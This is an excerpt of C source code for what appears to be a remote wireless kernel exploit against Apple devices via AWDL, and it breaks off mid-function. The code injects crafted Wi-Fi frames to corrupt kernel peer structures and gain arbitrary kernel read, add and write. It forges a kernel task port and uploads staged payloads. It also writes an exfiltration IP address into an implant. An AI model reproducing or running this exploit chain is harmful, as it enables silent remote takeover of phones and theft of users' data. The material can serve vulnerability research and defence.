  uint32_t ign2;
};

// return the contents of filename in a buffer
void* load_file(char* filename, size_t* out_size) {
  struct stat sb = {0};
  int err = stat(filename, &sb);
  if (err != 0) {
    perror("failed to open file");
    return NULL;
  }

  if (sb.st_size > 100000) {
    printf("that stage2 is kinda big...\n");
    return NULL;
  }

  FILE* f = fopen(filename, "r");
  if (!f) {
    perror("unable to open file\n");
    return NULL;
  }

  void* buf = malloc(sb.st_size);
  size_t n_read = fread(buf, 1, sb.st_size, f);
  if (n_read != sb.st_size) {
    printf("read is short\n");
    return NULL;
  }

  fclose(f);
  *out_size = sb.st_size;
  return buf;
}

uint64_t load_payload(uint64_t target_task, uint64_t physmap_kaddr, uint64_t userspace_addr, uint64_t kaslr_slide, uint64_t shared_cache_slide, char* stage2_filename) {
  // build the fake kernel task:
  uint64_t kern_proc = 0xFFFFFFF00941B818 + kaslr_slide; // this is proc0, in __DATA:__common
  printf("kern_proc: 0x%016llx\n", kern_proc);

  uint64_t kern_task = rk64(kern_proc+0x10);
  printf("kern_task: 0x%016llx\n", kern_task);

  uint64_t kern_map  = rk64(kern_task+0x28);
  printf("kern_map: 0x%016llx\n", kern_map);


  uint32_t fake_task_buf_size = 0x200;
  uint8_t* fake_task_buf = malloc(fake_task_buf_size);
  memset(fake_task_buf, 0, fake_task_buf_size);

  *(uint16_t*)(fake_task_buf+0x16) = 0x39; // zone index for tasks

  uint8_t* fake_task = fake_task_buf + 0x100;
  *(uint64_t*)(fake_task+0x000) = 0;    // lck_mtx_data
  *(uint8_t*) (fake_task+0x00b) = 0x22; // lck_mtx_type
  *(uint32_t*)(fake_task+0x010) = 4;    // ref_cnt
  *(uint32_t*)(fake_task+0x014) = 1;    // active
  *(uint64_t*)(fake_task+0x028) = kern_map;    // map

  uint64_t fake_task_buf_kaddr = copy_buffer_to_kmem(fake_task_buf, fake_task_buf_size, 0x8001, 0);
  printf("fake_task_buf_kaddr: 0x%016llx\n", fake_task_buf_kaddr);

  uint64_t fake_task_kaddr = fake_task_buf_kaddr + 0x100;


  // build the fake task port:
  // need ipc_space_kernel:
  uint64_t target_task_port = rk64(target_task + 0x108);
  uint64_t ipc_space_kernel = rk64(target_task_port + 0x60);
  printf("ipc_space_kernel: 0x%016llx\n", ipc_space_kernel);


  uint32_t fake_port_buf_size = 0x200;
  uint8_t* fake_port_buf = malloc(fake_task_buf_size);
  memset(fake_port_buf, 0, fake_port_buf_size);

  *(uint16_t*)(fake_port_buf+0x16) = 0x2a; // zone index for ipc ports
  
  uint8_t* fake_port = fake_port_buf + 0x100;
  *(uint32_t*)(fake_port+0x000) = 0x80000000 | 2; // ip_bits = IO_ACTIVE | IKOT_TASK 
  *(uint32_t*)(fake_port+0x004) = 4; // ip_references
  *(uint64_t*)(fake_port+0x060) = ipc_space_kernel; // ip_receiver
  *(uint64_t*)(fake_port+0x068) = fake_task_kaddr; // ip_kobject
  *(uint32_t*)(fake_port+0x09c) = 1; // ip_mscount
  *(uint32_t*)(fake_port+0x0a0) = 1; // ip_srights

  uint64_t fake_port_buf_kaddr = copy_buffer_to_kmem(fake_port_buf, fake_port_buf_size, 0x8001, 0);
  printf("fake_port_buf_kaddr: 0x%016llx\n", fake_port_buf_kaddr);

  uint64_t fake_port_kaddr = fake_port_buf_kaddr + 0x100;

  // give the victim task a send right:
  // we'll fix up these ports later in stage2 probably

  // for now, let's just copy the first thread's thread_self port;
  // it's *hopefully* not going to be used!
  // really we should either find a safer port, or allocate one properly with the r/w


  // we'll set out fake tfp0 as task_special_port 7 (TASK_SEATBELT_PORT)
  // TODO: this is potentially buggy as wk64 could write off the end...
  // which isn't safe here
  wk64(target_task+0x2e0, fake_port_kaddr);

  struct kconf kc = {0};

  // fragment and upload stage2:

  size_t stage2_filesize = 0;
  uint8_t* stage2_raw_bytes = load_file(stage2_filename, &stage2_filesize);

  // update the ip address in the implant:
  char* dummy_ip = "999.999.999.999";
  char* ptr_to_ip = memmem(stage2_raw_bytes, stage2_filesize, dummy_ip, strlen(dummy_ip) + 1);
  if (!ptr_to_ip) {
    printf("didn't find dummy ip in payload\n");
  }

  strcpy(ptr_to_ip, exfil_ip);

  // how many 1024 byte chunks is that?
  uint32_t n_fragments = (stage2_filesize + 1023)/1024;
  void* fragment = malloc(1024);
  uint32_t remaining = stage2_filesize;
  for (uint32_t i = 0; i < n_fragments; i++) {
    memset(fragment, 0, 1024);
    uint32_t to_copy = remaining>1024?1024:remaining;
    memcpy(fragment, stage2_raw_bytes+(i*1024), to_copy);
    remaining -= to_copy;

    // upload the fragment:
    uint64_t frag_kaddr = copy_buffer_to_kmem(fragment, 1024, 1025, 0);
    kc.text_fragments[i] = frag_kaddr;
  }

  kc.n_text_fragments = n_fragments;

  kc.kaslr_slide = kaslr_slide;

  // upload kc:
  uint64_t kc_kaddr = copy_buffer_to_kmem(&kc, sizeof(kc), sizeof(kc)+1, 0);
  
  printf("uploaded kconf to 0x%016llx\n", kc_kaddr);

  for (int i = 0; i < n_fragments; i++) {
    printf("fragment %d : 0x%016llx\n", kc.text_fragments[i]);
  }

  // link stage1
#define SYM(type, offset, val) *(type*)(((uint8_t*)stage1)+offset) = val
  uint64_t dlsym = 0x18025D45C+shared_cache_slide;
  uint64_t kdata = kc_kaddr;
  SYM(uint64_t, 0x270, dlsym);
  SYM(uint64_t, 0x278, kdata);

  // upload stage1
  printf("uploading stage1\n");
  uint64_t stage1_kaddr = copy_buffer_to_kmem(stage1, sizeof(stage1), sizeof(stage1)+1, 0);
  uint32_t stage1_size = sizeof(stage1);

  uint64_t stage1_physmap_kaddr = physmap_kaddr;

  // link stage0
  uint32_t task_self_name = 0x103;
  uint64_t mach_vm_read = 0x180236530+shared_cache_slide;
  uint64_t mach_vm_write = 0x180240C50+shared_cache_slide;
  uint64_t task_get_special_port = 0x180244BB8+shared_cache_slide;
  uint64_t stage1_uaddr = userspace_addr;
  uint64_t sys_icache_invalidate = 0x180168BCC+shared_cache_slide;

  printf("stage1_uaddr: 0x%016llx\n", stage1_uaddr);

#undef SYM
#define SYM(type, offset, val) *(type*)(((uint8_t*)stage0)+offset) = val
  SYM(uint32_t, 0x78, task_self_name);
  SYM(uint32_t, 0x7c, stage1_size);
  SYM(uint64_t, 0x80, stage1_kaddr);
  SYM(uint64_t, 0x88, mach_vm_read);
  SYM(uint64_t, 0x90, stage1_physmap_kaddr);
  SYM(uint64_t, 0x98, mach_vm_write);
  SYM(uint64_t, 0xa0, task_get_special_port);
  SYM(uint64_t, 0xa8, sys_icache_invalidate);
  SYM(uint64_t, 0xb0, stage1_uaddr);
  // use the slow write to place stage0 at userspace_addr:
  printf("uploading stage0\n");
  wkbuf(physmap_kaddr+0x3f00, (uint8_t*)stage0, sizeof(stage0));
  printf("stage0 uploaded!\n");

  return userspace_addr+0x3f00;
}







/*
 * note that these are not the AWDL timestamp values from the awdl header
 * we need to sync with the targets mach_absolute_time clock, which measures
 * in unitless ticks.
 * There of course is a unit; on MacOS it's nanoseconds; on iPhone 11 Pro
 * it's 125/3 nanosecond units
 */
uint64_t target_timestamp_to_nanoseconds(uint64_t target_timestamp) {
  return (target_timestamp*125)/3;
}

uint64_t nanoseconds_to_target_timestamp(uint64_t nanoseconds) {
  return (nanoseconds*3)/125;
}


struct arbitrary_add_params {
  struct ether_addr dst;
  struct ether_addr lower_peer_mac;
  struct ether_addr upper_peer_mac;

  uint64_t lower_peer_kaddr;
  uint64_t upper_peer_kaddr;

  uint8_t* leak;
  uint64_t clock_delta;
};

struct arbitrary_add_params aa_para = {0};

void init_arbitrary_add(struct ether_addr dst,
                        struct ether_addr lower_peer_mac,
                        struct ether_addr upper_peer_mac,
                        uint64_t lower_peer_kaddr,
                        uint64_t upper_peer_kaddr,
                        void* leak,
                        uint64_t clock_delta) {
  aa_para.dst = dst;
  aa_para.lower_peer_mac = lower_peer_mac;
  aa_para.upper_peer_mac = upper_peer_mac;
  aa_para.lower_peer_kaddr = lower_peer_kaddr;
  aa_para.upper_peer_kaddr = upper_peer_kaddr;
  aa_para.leak = leak;
  aa_para.clock_delta = clock_delta;
}


struct refresh_peers_params {
  struct ether_addr dst;
  uint32_t n_peers;
  struct ether_addr ign;
};

struct refresh_peers_params rp_para = {0};

void init_refresh_peers(struct ether_addr dst,
                       uint32_t n_peers,
                       struct ether_addr ign) {
  rp_para.dst = dst;
  rp_para.n_peers = n_peers;
  rp_para.ign = ign;
}

uint64_t last_refresh_timestamp = 0;

void refresh_peers() {
  uint64_t now = now_nanoseconds();

  // only refresh if at least 20 seconds have elapsed since the last refresh
  uint64_t elapsed_mili = (now - last_refresh_timestamp) / (1000*1000);
  
  printf("refresh_peers: %lld miliseconds elapsed since last refresh\n", elapsed_mili);

  if (elapsed_mili < 20*1000) {
    printf("  not refreshing\n");
    return;
  }

  struct ether_addr target_groom_peer = *(ether_aton("22:22:44:66:00:00"));
  printf("refreshing target peers\n");
  for (int k = 0; k < rp_para.n_peers; k++) {
    *(((uint16_t*)&target_groom_peer)+2) = k;
    if ( (memcmp(&target_groom_peer, &rp_para.ign, 6)) == 0) {
      printf("ignoring refresh peer\n");
      continue;
    }
    inject(RT(),
        WIFI(rp_para.dst, target_groom_peer),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(target_groom_peer),
        PKT_END());
  }
  
  struct ether_addr before_groom_peer = *(ether_aton("22:22:44:44:00:00"));
  printf("refreshing before peers\n");
  for (int k = 0; k < 40; k++) {
    *(((uint16_t*)&before_groom_peer)+2) = k;
    inject(RT(),
        WIFI(rp_para.dst, before_groom_peer),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(before_groom_peer),
        PKT_END());
  }
  
  struct ether_addr after_groom_peer = *(ether_aton("22:22:44:88:00:00"));
  printf("refreshing after peers\n");
  for (int k = 0; k < 40; k++) {
    *(((uint16_t*)&after_groom_peer)+2) = k;
    inject(RT(),
        WIFI(rp_para.dst, after_groom_peer),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(after_groom_peer),
        PKT_END());
  }
  
  struct ether_addr kalloc_map_peer = *(ether_aton("22:22:44:11:00:00"));
  printf("refreshing kalloc peers\n");
  for (int k = 0; k < 30; k++) {
    *(((uint16_t*)&kalloc_map_peer)+2) = k;
    inject(RT(),
        WIFI(rp_para.dst, kalloc_map_peer),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(kalloc_map_peer),
        PKT_END());
  }
  
  if (using_fast_read) {
    struct ether_addr regen_peer =  *(ether_aton("22:99:22:73:00:00"));
    for (uint16_t i = 0; i < regen_peer_id; i++) {
      *(((uint16_t*)&regen_peer)+2) = i; 
      inject(RT(),
          WIFI(rp_para.dst, regen_peer),
          AWDL(),
          SYNC_PARAMS(),
          SERV_PARAM(),
          HT_CAPS(),
          DATAPATH(regen_peer),
          PKT_END());
    }
  }

  for (int i = 0; i < 8; i++) {
    inject(RT(),
        WIFI(rp_para.dst, reader_peers[i]),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        PKT_END());
  }
  
  for (int k = 0; k < kmem_leak_peer_id; k++) {
    struct ether_addr kmem_leak_peer =  *(ether_aton("22:99:33:71:00:00"));
    *(((uint16_t*)&kmem_leak_peer)+2) = k;

    inject(RT(),
        WIFI(rp_para.dst, kmem_leak_peer),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(kmem_leak_peer),
        PKT_END());
  }




  printf("refreshed targets, continuing...\n");
  last_refresh_timestamp = now_nanoseconds();
  
}

/*

let's try a new idea for the arbitrary add:

rather than faking a timestamp instead overwrite peer_manager twice;
the first time; point it such that we get an arbitrary add to the n_frames_in_last_second field.
then corrupt it again and point it to the target
then put the real one back

*/

int need_leak_buffer_reload = 0;

void arbitrary_add(uint64_t target_kaddr, uint32_t target_val) {
  if (target_val < 0x69) {
    printf("***************** target_val needs to be >= 0x69! ************************\n");
    return;
  }

  // after we get the fast read going we start allocating a lot of new peers
  // (a new peer per read)
  // this means that, especially with the 5GHz list semantics, its possible we mess the list
  // up if we put the old LL pointers back.

  // to mitigate this, lets re-read the arbitrary_write_buffer if we need to.

  if (need_leak_buffer_reload) {
    printf("reloading leak buffer\n");
    printf("before: 0x%016llx 0x%016llx\n", *(uint64_t*)(aa_para.leak+0x1bb+0x10), *(uint64_t*)(aa_para.leak+0x1bb+0x18));
    uint8_t* new_leak = arbitrary_read_fast(aa_para.lower_peer_kaddr + 0x1648 - 3, 0x32b); 
    memcpy(aa_para.leak, new_leak, 0x32b);
    printf("before: 0x%016llx 0x%016llx\n", *(uint64_t*)(aa_para.leak+0x1bb+0x10), *(uint64_t*)(aa_para.leak+0x1bb+0x18));
    free(new_leak);
  }

  uint8_t* arbitrary_write_buffer = malloc(0x340);
  memset(arbitrary_write_buffer, 0, 0x340);
  memcpy(arbitrary_write_buffer, aa_para.leak, 0x32b);

  // this is here to force the target to increase the number of AW's on our channel
  // TODO: can we increase it even more by sending data frames too?

  // actually for now this is just another way to ensure upper hasn't received any frames for at least 1 second

  while (1) {
    // clear upper's last_frame timestamp:
    uint8_t timestamp_buf[0x60] = {0};
    *(uint64_t*)(timestamp_buf+0x40) = 0; // fake timestamp
    *(uint32_t*)(timestamp_buf+0x48) = 0x4343; // n_frames_in_last_second

    inject(RT(),
        WIFI(aa_para.dst, aa_para.upper_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(aa_para.upper_peer_mac),
        SYNC_TREE((struct ether_addr*)(timestamp_buf), 0x60/sizeof(struct ether_addr)),
        PKT_END());
    
    // give upper a fresh timestamp:
    inject(RT(),
        WIFI(aa_para.dst, aa_para.upper_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        PKT_END());

    uint64_t timestamp_start = now_nanoseconds();

    // corrupt upper's peer_manager such that the add will bump up the n_frames_in_last_second field:
    *(uint64_t*)(arbitrary_write_buffer+0x1e3) = aa_para.upper_peer_kaddr+0x1693-0x7c80;

    inject(RT(),
        WIFI(aa_para.dst, aa_para.lower_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(aa_para.lower_peer_mac),
        SYNC_TREE((struct ether_addr*)(arbitrary_write_buffer+3), 0x52), // need to write at least 0x1e8 bytes to hit the peer_manager pointer
        PKT_END());

    // send a packet to upper; we only need to bump the n_frames field up by at least 0x20, so no need to pad the frame:
    int received = 0;
    do {
      // only continue if <800ms elapsed
      if (now_nanoseconds() - timestamp_start > 600*1000*1000) {
        // abort; need to fixup upper
        printf("aborting arbitrary_write at checkpoint 1 (arbitrary_add)\n");
        goto abort_and_retry;
      }
      received = try_inject(RT(),
          WIFI(aa_para.dst, aa_para.upper_peer_mac),
          AWDL(),
          SYNC_PARAMS(),
          SERV_PARAM(),
          PKT_END());
    } while(!received);


    // now corrupt upper's peer_manager again so that it points to the real arbitrary_add target:
    *(uint64_t*)(arbitrary_write_buffer+0x1e3) = target_kaddr-0x7c80;
    inject(RT(),
        WIFI(aa_para.dst, aa_para.lower_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(aa_para.lower_peer_mac),
        SYNC_TREE((struct ether_addr*)(arbitrary_write_buffer+3), 0x52), // need to write at least 0x1e8 bytes to hit the peer_manager pointer
        PKT_END());
   
    // the target arbitrary_add: 
    do {
      // only continue if <800ms elapsed
      if (now_nanoseconds() - timestamp_start > 600*1000*1000) {
        // abort; need to fixup upper
        printf("aborting arbitrary_write at checkpoint 2 (arbitrary_add)\n");
        goto abort_and_retry;
      }
      received = try_inject(RT(),
        WIFI(aa_para.dst, aa_para.upper_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        TLV_IGN(target_val-0x66),
        PKT_END());
    } while(!received);


    // fixup upper's peer_manager field:
    memcpy(arbitrary_write_buffer, aa_para.leak, 0x32b);
    inject(RT(),
        WIFI(aa_para.dst, aa_para.lower_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(aa_para.lower_peer_mac),
        SYNC_TREE((struct ether_addr*)(arbitrary_write_buffer+3), 0x52), // need to write at least 0x1e8 bytes to hit the peer_manager pointer
        PKT_END());
    break;

abort_and_retry:
    // fixup upper's peer_manager field:
    memcpy(arbitrary_write_buffer, aa_para.leak, 0x32b);
    inject(RT(),
        WIFI(aa_para.dst, aa_para.lower_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(aa_para.lower_peer_mac),
        SYNC_TREE((struct ether_addr*)(arbitrary_write_buffer+3), 0x52), // need to write at least 0x1e8 bytes to hit the peer_manager pointer
        PKT_END());
    
  }

  printf("********************************************************************* new arbitrary_add success??\n");

  return;
}

// latest version...
int wkbuf_bundled(uint64_t target_kaddr, uint8_t* buf, size_t len) {
  refresh_peers();

  // want 3 bytes of padding at the end of original
  uint8_t* _original = arbitrary_read_fast(target_kaddr, len);
  uint8_t* original = malloc(len+3);
  memset(original, 0, len+3);
  memcpy(original, _original, len);
  
  printf("padded original\n");
  hexdump(original, len+3);

  uint8_t timestamp_buf[0x60] = {0};
  *(uint64_t*)(timestamp_buf+0x40) = 0; // fake timestamp
  *(uint32_t*)(timestamp_buf+0x48) = 0; // n_frames_in_last_second

  // clear lower's last_frame timestamp and frames_in_last_second
  inject(RT(),
      WIFI(aa_para.dst, aa_para.lower_peer_mac),
      AWDL(),
      SYNC_PARAMS(),
      SERV_PARAM(),
      HT_CAPS(),
      DATAPATH(aa_para.lower_peer_mac),
      SYNC_TREE((struct ether_addr*)(timestamp_buf), 0x60/sizeof(struct ether_addr)),
      PKT_END());

  // lower now has a timestamp and count of 0
 
  // after we get the fast read going we start allocating a lot of new peers
  // (a new peer per read)
  // this means that, especially with the 5GHz list semantics, its possible we mess the list
  // up if we put the old LL pointers back.

  // to mitigate this, lets re-read the arbitrary_write_buffer if we need to.

  // reload the leak buffer:
  //printf("reloading leak buffer\n");
  //printf("before: 0x%016llx 0x%016llx\n", *(uint64_t*)(aa_para.leak+0x1bb+0x10), *(uint64_t*)(aa_para.leak+0x1bb+0x18));
  uint8_t* new_leak = arbitrary_read_fast(aa_para.lower_peer_kaddr + 0x1648 - 3, 0x32b); 
  //memcpy(aa_para.leak, new_leak, 0x32b);
  //printf("before: 0x%016llx 0x%016llx\n", *(uint64_t*)(aa_para.leak+0x1bb+0x10), *(uint64_t*)(aa_para.leak+0x1bb+0x18));
  free(new_leak);

  // leak buffer now has lower with a 0 timestamp

  //printf("wkbuf_bundled, aa_para.leak\n");
  //hexdump(aa_para.leak, 0x32b);

  uint8_t* arbitrary_write_buffer = malloc(0x340);
  memset(arbitrary_write_buffer, 0, 0x340);
  memcpy(arbitrary_write_buffer, aa_para.leak, 0x32b);

  size_t current_byte_offset = 0;

  uint64_t safety_window_nano = 100*1000*1000;

  uint32_t bytes_written = 0;

  while (1) {
    usleep(200*1000); // wait 200ms...
    // clear upper's last_frame timestamp
    inject(RT(),
        WIFI(aa_para.dst, aa_para.upper_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(aa_para.upper_peer_mac),
        SYNC_TREE((struct ether_addr*)(timestamp_buf), 0x60/sizeof(struct ether_addr)),
        PKT_END());
    
    uint64_t timestamp_start = now_nanoseconds();

    // give upper a fresh timestamp:
    inject(RT(),
        WIFI(aa_para.dst, aa_para.upper_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        PKT_END());
    
    // corrupt upper's peer_manager such that the add will bump up the n_frames_in_last_second field:
    *(uint64_t*)(arbitrary_write_buffer+0x1e3) = aa_para.upper_peer_kaddr+0x1693-0x7c80;

    // this will also reset lower's timestamp and cnt
    inject(RT(),
        WIFI(aa_para.dst, aa_para.lower_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(aa_para.lower_peer_mac),
        SYNC_TREE((struct ether_addr*)(arbitrary_write_buffer+3), 0x52), // need to write at least 0x1e8 bytes to hit the peer_manager pointer
        PKT_END());

    int received = 0;
    do {
      if ((now_nanoseconds() - timestamp_start) > safety_window_nano) {
        printf("aborting arbitrary_write at checkpoint 1 (wkbuf_bundled)\n");
        goto abort_and_retry;
      }
      received = try_inject(RT(),
          WIFI(aa_para.dst, aa_para.upper_peer_mac),
          AWDL(),
          SYNC_PARAMS(),
          SERV_PARAM(),
          PKT_END());
    } while(!received);

    // upper now has a valid timestamp and large count

    while (1) {
      //printf("setting write target with current_byte_offset: 0x%x\n", current_byte_offset);

      *(uint64_t*)(arbitrary_write_buffer+0x1e3) = target_kaddr-0x7c80+current_byte_offset;
      inject(RT(),
         WIFI(aa_para.dst, aa_para.lower_peer_mac),
         AWDL(),
         SYNC_PARAMS(),
         SERV_PARAM(),
         HT_CAPS(),
         DATAPATH(aa_para.lower_peer_mac),
         SYNC_TREE((struct ether_addr*)(arbitrary_write_buffer+3), 0x52), // need to write at least 0x1e8 bytes to hit the peer_manager pointer
         PKT_END());

      
      uint8_t current_byte = original[current_byte_offset];
      //printf("current byte: %02x\n", current_byte);
      uint8_t desired_byte = buf[current_byte_offset];
      //printf("desired_byte: %02x\n", desired_byte);
      uint8_t delta_byte = desired_byte - current_byte;
      //printf("delta_byte: %02x\n", delta_byte);
      uint16_t delta_val = delta_byte;
      //printf("delta_val: %04x\n", delta_val);

      if (current_byte != desired_byte) {
        // this can be 0x69?
        if (delta_val < 0x80) {
          delta_val += 0x100;
        }
        
        //printf("delta_val_used: %04x\n", delta_val);

        // the target arbitrary_add: 
        do {
         uint64_t elapsed_nanos = now_nanoseconds() - timestamp_start;
         //printf("arbitrary_add: %016ull nanos since start\n", elapsed_nanos);
         if (elapsed_nanos > safety_window_nano) {
           //printf("aborting arbitrary_write at checkpoint 2 (wkbuf_bundled)\n");
           goto abort_and_retry;
         }
         received = try_inject(RT(),
           WIFI(aa_para.dst, aa_para.upper_peer_mac),
           AWDL(),
           SYNC_PARAMS(),
           SERV_PARAM(),
           TLV_IGN(delta_val-0x66),
           PKT_END());
        } while(!received);
      }

      bytes_written++;
      //printf("written %d bytes\n", bytes_written);

      //printf("original buffer before:\n");
      //hexdump(original, len+3);
      *((uint32_t*)(original+current_byte_offset)) += ((uint32_t)delta_val);
      //printf("original buffer after:\n");
      //hexdump(original, len+3);

      current_byte_offset++;

      if (current_byte_offset == len) {
        memcpy(arbitrary_write_buffer, aa_para.leak, 0x32b);
        inject(RT(),
            WIFI(aa_para.dst, aa_para.lower_peer_mac),
            AWDL(),
            SYNC_PARAMS(),
            SERV_PARAM(),
            HT_CAPS(),
            DATAPATH(aa_para.lower_peer_mac),
            SYNC_TREE((struct ether_addr*)(arbitrary_write_buffer+3), 0x52), // need to write at least 0x1e8 bytes to hit the peer_manager pointer
            PKT_END());


        uint8_t* updated_buf = arbitrary_read_fast(target_kaddr, len);

        printf("before:\n");
        hexdump(_original, len);
        printf("want to write:\n");
        hexdump(buf, len);
        printf("after:\n");
        hexdump(updated_buf, len);

        int worked = 0;
        if ((memcmp(updated_buf, buf, len)) != 0) {
          printf("they differ :(\n");
        } else {
          printf("bundled_write success!\n");
          worked = 1;
        }
        free(original);
        free(_original);
        free(updated_buf);
        free(arbitrary_write_buffer);
        return worked;
      }
    }

abort_and_retry:
    ;//printf("abort and retry\n");
  }
  return 0;
}

int wkbuf_bundled_reliable(uint64_t target_kaddr, uint8_t* buf, size_t len) {
  uint32_t has_bad_bytes = 0; 
  size_t current_byte_offset = 0;

  uint64_t safety_window_nano = 100*1000*1000;

  uint32_t bytes_written = 0;
  uint8_t* original = NULL;
  uint8_t* _original = NULL;

  uint8_t timestamp_buf[0x60] = {0};
  *(uint64_t*)(timestamp_buf+0x40) = 0; // fake timestamp
  *(uint32_t*)(timestamp_buf+0x48) = 0; // n_frames_in_last_second

restart_with_new_read:
  current_byte_offset = 0;
  bytes_written = 0;
  has_bad_bytes = 0;

  refresh_peers();
  // want 3 bytes of padding at the end of original
  _original = arbitrary_read_fast(target_kaddr, len);
  original = malloc(len+3);
  memset(original, 0, len+3);
  memcpy(original, _original, len);
  
  //printf("padded original\n");
  //hexdump(original, len+3);


  // clear lower's last_frame timestamp and frames_in_last_second
  inject(RT(),
      WIFI(aa_para.dst, aa_para.lower_peer_mac),
      AWDL(),
      SYNC_PARAMS(),
      SERV_PARAM(),
      HT_CAPS(),
      DATAPATH(aa_para.lower_peer_mac),
      SYNC_TREE((struct ether_addr*)(timestamp_buf), 0x60/sizeof(struct ether_addr)),
      PKT_END());

  // lower now has a timestamp and count of 0
 
  // after we get the fast read going we start allocating a lot of new peers
  // (a new peer per read)
  // this means that, especially with the 5GHz list semantics, its possible we mess the list
  // up if we put the old LL pointers back.

  // to mitigate this, lets re-read the arbitrary_write_buffer if we need to.

  // reload the leak buffer:
  printf("reloading leak buffer\n");
  printf("before: 0x%016llx 0x%016llx\n", *(uint64_t*)(aa_para.leak+0x1bb+0x10), *(uint64_t*)(aa_para.leak+0x1bb+0x18));
  uint8_t* new_leak = arbitrary_read_fast(aa_para.lower_peer_kaddr + 0x1648 - 3, 0x32b); 
  memcpy(aa_para.leak, new_leak, 0x32b);
  printf("before: 0x%016llx 0x%016llx\n", *(uint64_t*)(aa_para.leak+0x1bb+0x10), *(uint64_t*)(aa_para.leak+0x1bb+0x18));
  free(new_leak);

  // leak buffer now has lower with a 0 timestamp

  printf("wkbuf_bundled, aa_para.leak\n");
  hexdump(aa_para.leak, 0x32b);

  uint8_t* arbitrary_write_buffer = malloc(0x340);
  memset(arbitrary_write_buffer, 0, 0x340);
  memcpy(arbitrary_write_buffer, aa_para.leak, 0x32b);


  while (1) {
    // clear upper's last_frame timestamp
    inject(RT(),
        WIFI(aa_para.dst, aa_para.upper_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(aa_para.upper_peer_mac),
        SYNC_TREE((struct ether_addr*)(timestamp_buf), 0x60/sizeof(struct ether_addr)),
        PKT_END());
    
    uint64_t timestamp_start = now_nanoseconds();

    // give upper a fresh timestamp:
    inject(RT(),
        WIFI(aa_para.dst, aa_para.upper_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        PKT_END());
    
    // corrupt upper's peer_manager such that the add will bump up the n_frames_in_last_second field:
    *(uint64_t*)(arbitrary_write_buffer+0x1e3) = aa_para.upper_peer_kaddr+0x1693-0x7c80;

    // this will also reset lower's timestamp and cnt
    inject(RT(),
        WIFI(aa_para.dst, aa_para.lower_peer_mac),
        AWDL(),
        SYNC_PARAMS(),
        SERV_PARAM(),
        HT_CAPS(),
        DATAPATH(aa_para.lower_peer_mac),
        SYNC_TREE((struct ether_addr*)(arbitrary_write_buffer+3), 0x52), // need to write at least 0x1e8 bytes to hit the peer_manager pointer
        PKT_END());

    int received = 0;
    do {
      if ((now_nanoseconds() - timestamp_start) > safety_window_nano) {
        printf("aborting arbitrary_write at checkpoint 1 (wkbuf_bundled)\n");
        goto abort_and_retry;
      }
      received = try_inject(RT(),
          WIFI(aa_para.dst, aa_para.upper_peer_mac),
          AWDL(),
          SYNC_PARAMS(),
          SERV_PARAM(),
          PKT_END());
    } while(!received);

    // upper now has a valid timestamp and large count

    while (1) {
      //printf("setting write target with current_byte_offset: 0x%x\n", current_byte_offset);
      
      uint8_t current_byte = original[current_byte_offset];
      //printf("current byte: %02x\n", current_byte);
      uint8_t desired_byte = buf[current_byte_offset];
      //printf("desired_byte: %02x\n", desired_byte);
      uint8_t delta_byte = desired_byte - current_byte;
      //printf("delta_byte: %02x\n", delta_byte);
      uint16_t delta_val = delta_byte;
      //printf("delta_val: %04x\n", delta_val);

      // this can be 0x69?
      if (delta_val < 0x80) {
        delta_val += 0x100;
      }
      
      if (current_byte != desired_byte) {
        has_bad_bytes = 1;
        *(uint64_t*)(arbitrary_write_buffer+0x1e3) = target_kaddr-0x7c80+current_byte_offset;
        inject(RT(),
           WIFI(aa_para.dst, aa_para.lower_peer_mac),
           AWDL(),
           SYNC_PARAMS(),
           SERV_PARAM(),
           HT_CAPS(),
           DATAPATH(aa_para.lower_peer_mac),
           SYNC_TREE((struct ether_addr*)(arbitrary_write_buffer+3), 0x52), // need to write at least 0x1e8 bytes to hit the peer_manager pointer
           PKT_END());
        
        //printf("delta_val_used: %04x\n", delta_val);

        // the target arbitrary_add: 
        do {
         uint64_t elapsed_nanos = now_nanoseconds() - timestamp_start;
         //printf("arbitrary_add: %016ull nanos since start\n", elapsed_nanos);
         if (elapsed_nanos > safety_window_nano) {
           //printf("aborting arbitrary_write at checkpoint 2 (wkbuf_bundled)\n");
           goto abort_and_retry;
         }
         received = try_inject(RT(),
           WIFI(aa_para.dst, aa_para.upper_peer_mac),
           AWDL(),
           SYNC_PARAMS(),
           SERV_PARAM(),
           TLV_IGN(delta_val-0x66),
           PKT_END());
        } while(!received);

        //printf("original buffer before:\n");
        //hexdump(original, len+3);
        *((uint32_t*)(original+current_byte_offset)) += ((uint32_t)delta_val);
        //printf("original buffer after:\n");
        //hexdump(original, len+3);
        bytes_written++;

      } else {
        ;// skip, value already correct
      }
      
      current_byte_offset++;

      if (current_byte_offset == len) {
        memcpy(arbitrary_write_buffer, aa_para.leak, 0x32b);
        inject(RT(),
            WIFI(aa_para.dst, aa_para.lower_peer_mac),
